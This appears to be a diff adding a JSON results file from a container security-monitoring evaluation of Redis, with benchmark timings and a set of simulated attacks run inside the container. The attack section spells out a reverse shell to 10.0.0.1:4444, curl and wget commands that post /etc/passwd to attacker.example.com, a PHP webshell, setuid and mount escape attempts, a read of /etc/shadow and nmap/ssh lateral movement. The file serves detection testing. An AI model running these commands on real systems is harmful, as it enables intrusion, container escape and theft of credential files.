@@ -1,0 +1,274 @@
+{
+  "redis": {
+    "workload": "redis",
+    "timestamp": "2026-01-05T10:18:46.405825",
+    "container_config": {
+      "image": "redis:7-alpine",
+      "name": "wasmsentinel-redis",
+      "ports": {
+        "6379": "16379"
+      },
+      "env": {},
+      "command": null,
+      "healthcheck": "redis-cli ping",
+      "volumes": {}
+    },
+    "phases": {
+      "baseline": {
+        "elapsed_seconds": 33.99072074890137,
+        "stdout": " \nPING_INLINE: rps=0.0 (overall: -nan) avg_msec=-nan (overall: -nan)\n                                                                   \nPING_INLINE: rps=76584.0 (overall: 76584.0) avg_msec=0.437 (overall: 0.437)\n                                                                            \nPING_INLINE: rps=84231.1 (overall: 80415.2) avg_msec=0.352 (overall: 0.392)\n                                                                            \nPING_INLINE: rps=84924.0 (overall: 81916.1) avg_msec=0.352 (overall: 0.378)\n                                                                            \nPING_INLINE: rps=85228.0 (overall: 82743.2) avg_msec=0.344 (overall: 0.370)\n                                                                            \nPING_INLINE: 81833.06 requests per second, p50=0.335 msec\n \nPING_MBULK: rps=7916.3 (overall: 79480.0) avg_msec=0.380 (overall: 0.380)\n                                                                          \nPING_MBULK: rps=80912.0 (overall: 80781.8) avg_msec=0.372 (overall: 0.372)\n                                                                           \nPING_MBULK: rps=81564.0 (overall: 81154.3) avg_msec=0.365 (overall: 0.369)\n                                                                           \nPING_MBULK: rps=78900.4 (overall: 80425.3) avg_msec=0.380 (overall: 0.372)\n                                                                           \nPING_MBULK: rps=79788.0 (overall: 80270.0) avg_msec=0.379 (overall: 0.374)\n                                                                           \nPING_MBULK: 80000.00 requests per second, p50=0.343 msec\n \nSET: rps=6972.0 (overall: 83000.0) avg_msec=0.401 (overall: 0.401)\n                                                                   \nSET: rps=76533.9 (overall: 77033.1) avg_msec=0.391 (overall: 0.392)\n                                                                    \nSET: rps=79900.0 (overall: 78406.1) avg_msec=0.375 (overall: 0.384)\n                                       ",
+        "stderr": "",
+        "returncode": 0,
+        "stats_before": {
+          "cpu_percent": 0.32,
+          "memory": "4.121MiB / 125.7GiB",
+          "network": "3.25kB / 126B"
+        },
+        "stats_after": {
+          "cpu_percent": 0.33,
+          "memory": "6.316MiB / 125.7GiB",
+          "network": "256MB / 1.5GB"
+        }
+      },
+      "monitored": {
+        "elapsed_seconds": 33.2099244594574,
+        "stdout": " \nPING_INLINE: rps=0.0 (overall: 0.0) avg_msec=-nan (overall: -nan)\n                                                                  \nPING_INLINE: rps=79808.0 (overall: 79490.0) avg_msec=0.384 (overall: 0.384)\n                                                                            \nPING_INLINE: rps=77270.9 (overall: 78380.5) avg_msec=0.394 (overall: 0.389)\n                                                                            \nPING_INLINE: rps=81356.0 (overall: 79369.7) avg_msec=0.371 (overall: 0.383)\n                                                                            \nPING_INLINE: rps=78896.0 (overall: 79251.5) avg_msec=0.398 (overall: 0.387)\n                                                                            \nPING_INLINE: 80000.00 requests per second, p50=0.351 msec\n \nPING_MBULK: rps=0.0 (overall: -nan) avg_msec=-nan (overall: -nan)\n                                                                  \nPING_MBULK: rps=80378.5 (overall: 80378.5) avg_msec=0.372 (overall: 0.372)\n                                                                           \nPING_MBULK: rps=82472.0 (overall: 81423.2) avg_msec=0.358 (overall: 0.365)\n                                                                           \nPING_MBULK: rps=82212.0 (overall: 81685.8) avg_msec=0.369 (overall: 0.366)\n                                                                           \nPING_MBULK: rps=81561.8 (overall: 81654.7) avg_msec=0.370 (overall: 0.367)\n                                                                           \nPING_MBULK: 81900.09 requests per second, p50=0.343 msec\n \nSET: rps=8904.0 (overall: 82444.4) avg_msec=0.328 (overall: 0.328)\n                                                                   \nSET: rps=80080.0 (overall: 80310.5) avg_msec=0.388 (overall: 0.382)\n                                                                    \nSET: rps=78792.0 (overall: 79590.1) avg_msec=0.414 (overall: 0.397)\n                                                         ",
+        "stderr": "",
+        "returncode": 0,
+        "stats_before": {
+          "cpu_percent": 0.33,
+          "memory": "6.34MiB / 125.7GiB",
+          "network": "256MB / 1.5GB"
+        },
+        "stats_after": {
+          "cpu_percent": 0.36,
+          "memory": "6.934MiB / 125.7GiB",
+          "network": "512MB / 2.99GB"
+        },
+        "monitoring": "simulated"
+      },
+      "attacks": {
+        "reverse_shell_attempt": {
+          "name": "Reverse Shell Attempt",
+          "severity": "critical",
+          "commands": [
+            {
+              "command": "bash -c \"exec 5<>/dev/tcp/10.0.0.1/4444 2>/dev/null\" || true",
+              "returncode": 0,
+              "elapsed_ms": 58.35461616516113,
+              "stdout": "",
+              "stderr": "sh: bash: not found\n"
+            },
+            {
+              "command": "python3 -c \"import socket; s=socket.socket(); s.connect(('10.0.0.1',4444))\" 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 54.89468574523926,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "socket",
+            "connect",
+            "dup2",
+            "execve"
+          ]
+        },
+        "privilege_escalation": {
+          "name": "Privilege Escalation",
+          "severity": "critical",
+          "commands": [
+            {
+              "command": "sudo -n id 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 61.344146728515625,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "cat /etc/shadow 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 63.68827819824219,
+              "stdout": "root:*::0:::::\nbin:!::0:::::\ndaemon:!::0:::::\nlp:!::0:::::\nsync:!::0:::::\nshutdown:!::0:::::\nhalt:!::0:::::\nmail:!::0:::::\nnews:!::0:::::\nuucp:!::0:::::\ncron:!::0:::::\nftp:!::0:::::\nsshd:!::0:::::\ngam",
+              "stderr": ""
+            },
+            {
+              "command": "chmod u+s /bin/sh 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 69.14329528808594,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "setuid",
+            "setgid",
+            "execve",
+            "openat"
+          ]
+        },
+        "container_escape": {
+          "name": "Container Escape Attempt",
+          "severity": "critical",
+          "commands": [
+            {
+              "command": "cat /proc/1/cgroup 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 64.81122970581055,
+              "stdout": "0::/\n",
+              "stderr": ""
+            },
+            {
+              "command": "ls -la /var/run/docker.sock 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 61.74731254577637,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "mount --bind / /mnt 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 59.11898612976074,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "openat",
+            "mount",
+            "pivot_root"
+          ]
+        },
+        "data_exfiltration": {
+          "name": "Data Exfiltration",
+          "severity": "high",
+          "commands": [
+            {
+              "command": "curl -s http://attacker.example.com/exfil -d @/etc/passwd 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 53.76720428466797,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "wget -q --post-file=/etc/passwd http://attacker.example.com/ 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 67.53849983215332,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "openat",
+            "read",
+            "socket",
+            "connect",
+            "sendto"
+          ]
+        },
+        "cryptominer_behavior": {
+          "name": "Cryptominer Behavior",
+          "severity": "medium",
+          "commands": [
+            {
+              "command": "dd if=/dev/zero of=/dev/null bs=1M count=1000 2>/dev/null &",
+              "returncode": 0,
+              "elapsed_ms": 64.30912017822266,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "for i in $(seq 1 4); do sha256sum /dev/zero & done; sleep 5; pkill sha256sum 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 5065.938234329224,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "clone",
+            "sched_setaffinity",
+            "read",
+            "write"
+          ]
+        },
+        "webshell_upload": {
+          "name": "Webshell Upload Simulation",
+          "severity": "high",
+          "commands": [
+            {
+              "command": "echo \"<?php system($_GET[cmd]); ?>\" > /tmp/shell.php 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 55.010318756103516,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "curl -X POST -F \"file=@/tmp/shell.php\" http://localhost/ 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 54.00276184082031,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "openat",
+            "write",
+            "socket",
+            "sendto"
+          ]
+        },
+        "lateral_movement": {
+          "name": "Lateral Movement",
+          "severity": "high",
+          "commands": [
+            {
+              "command": "ping -c 1 172.17.0.1 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 62.66164779663086,
+              "stdout": "PING 172.17.0.1 (172.17.0.1): 56 data bytes\n64 bytes from 172.17.0.1: seq=0 ttl=64 time=0.058 ms\n\n--- 172.17.0.1 ping statistics ---\n1 packets transmitted, 1 packets received, 0% packet loss\nround-tri",
+              "stderr": ""
+            },
+            {
+              "command": "nmap -sP 172.17.0.0/24 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 54.177045822143555,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "ssh -o ConnectTimeout=1 root@172.17.0.2 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 54.78858947753906,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "socket",
+            "connect",
+            "sendto",
+            "recvfrom"
+          ]
+        }
+      },
+      "overhead": {
+        "cpu_samples": [
+          0.37,
+          0.39,
+          0.35,
+          0.34,
+          0.36,
+          0.37,
+          0.38,
+          0.34,
+          0.38,
+          0.31
+        ],
+        "cpu_mean": 0.359,
+        "cpu_stdev": 0.024244128727957573
+      }
+    },
+    "overhead_percent": -2.297086593755757
+  }
+}
